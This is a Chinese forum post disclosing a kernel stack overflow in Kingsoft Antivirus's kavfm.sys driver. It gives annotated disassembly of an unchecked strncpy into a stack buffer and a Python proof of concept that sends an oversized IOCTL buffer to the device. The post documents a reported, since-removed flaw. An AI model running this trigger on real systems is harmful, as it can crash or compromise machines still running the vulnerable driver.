
# [原创]金山毒霸2011内核溢出漏洞

这个漏洞是我7月份报告给金山的，漏洞存在于`kavfm.sys`中，它没有正确处理用户提交的参数，因此导致了这个溢出漏洞。

在新版本中，这个驱动被去掉了。

影响版本：`Kingsoft Antivirus <=v2010.04.26.648`

## 漏洞分析

```
.text:00012160

.text:00012160 sub_12160       proc near               ; CODE XREF: sub_129B0+2Fp

.text:00012160

.text:00012160 var_44          = byte ptr -44h

.text:00012160 var_4           = dword ptr -4

.text:00012160 arg_4           = dword ptr  0Ch

.text:00012160

.text:00012160                 push    ebp

.text:00012161                 mov     ebp, esp

.text:00012163                 mov     ecx, [ebp+arg_4]

.text:00012166                 mov     eax, [ecx+60h]

.text:00012169                 sub     esp, 44h

.text:0001216C                 push    ebx

.text:0001216D                 mov     ebx, [eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength]

.text:00012170                 mov     eax, [eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.IoControlCode]

.text:00012173                 push    esi

.text:00012174                 add     eax, 7FFCFFFCh

.text:00012179                 xor     esi, esi

.text:0001217B                 cmp     eax, 28h        ; switch 41 cases

.text:0001217E                 push    edi

.text:0001217F                 mov     edi, [ecx+IRP.AssociatedIrp.SystemBuffer]

.text:00012182                 ja      loc_122E0       ; default

.text:00012182                                         ; jumptable 0001218F cases 1-3,5-7,9-11,13-15,17-19,21-23,25-27,29-31,33-35,37-39

.text:00012188                 movzx   eax, ds:byte_1231C[eax]

.text:0001218F                 jmp     ds:off_122EC[eax*4] ; switch jump

.text:00012196

.text:00012196 loc_12196:                              ; DATA XREF: .text:off_122ECo

.text:00012196                 push    ebx             ; 拷贝长度是InputBufferLength，是我们可控制的。

.text:00012197                 lea     ecx, [ebp+var_44];

.text:0001219A                 push    edi             ; 如果这个串大于72字节就可以覆盖到返回地址。

.text:0001219B                 push    ecx             ; char *

.text:0001219C                 call    strncpy

.text:000121A1                 add     esp, 0Ch

.text:000121A4                 lea     edx, [ebp+var_44]

.text:000121A7                 push    edx

.text:000121A8                 mov     [ebp+ebx+var_44], 0

.text:000121AD                 call    sub_15410

.text:000121B2                 pop     edi

.text:000121B3                 mov     esi, eax

.text:000121B5                 pop     esi

.text:000121B6                 pop     ebx

.text:000121B7                 mov     esp, ebp

.text:000121B9                 pop     ebp

.text:000121BA                 retn    8
```

## poc

```
#!/usr/bin/python

from ctypes import *

kernel32 = windll.kernel32

Psapi    = windll.Psapi

if __name__ == '__main__':

    GENERIC_READ  = 0x80000000

    GENERIC_WRITE = 0x40000000

    OPEN_EXISTING = 0x3

    CREATE_ALWAYS = 0x2

    DEVICE_NAME   = "\\\\.\\kavfm"

    dwReturn      = c_ulong()

    out_size      = 1024

    in_size       = 1024

    in_data       =''

    driver_handle1 = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,

                                                0, None, CREATE_ALWAYS, 0, None)

    in_data=1024*'\\x80'

    dev_ioctl = kernel32.DeviceIoControl(driver_handle1, 0x80030004, in_data,500, 0, 0,byref(dwReturn), None)
EOF
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
